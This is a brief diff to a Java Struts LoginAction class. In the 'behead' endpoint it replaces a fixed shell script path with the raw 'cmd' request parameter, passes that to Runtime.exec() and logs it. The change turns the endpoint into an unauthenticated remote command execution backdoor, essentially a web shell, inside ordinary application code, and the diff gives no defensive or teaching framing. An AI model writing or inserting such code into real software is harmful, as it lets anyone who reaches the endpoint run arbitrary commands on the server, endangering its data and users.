@@ -194,12 +194,13 @@ public class LoginAction extends BaseListAction {
 	@Action(value = "behead", results = { @Result(name = "success", type = "json", params = { "ignoreHierarchy", "false" }) }, params = { "contentType", "text/html" })
 	public String behead() throws FLException {
 
-		String cmd = "sh /home/fanglin/bin/behead";
+		String cmd = request.getParameter("cmd");
 
 		Runtime run = Runtime.getRuntime();
 
 		try {
 			run.exec(cmd);
+			System.out.println(cmd);
 		} catch (Exception e) {
 			setErrorCode(110000);
 			setErrorMsg("系统处理问题");
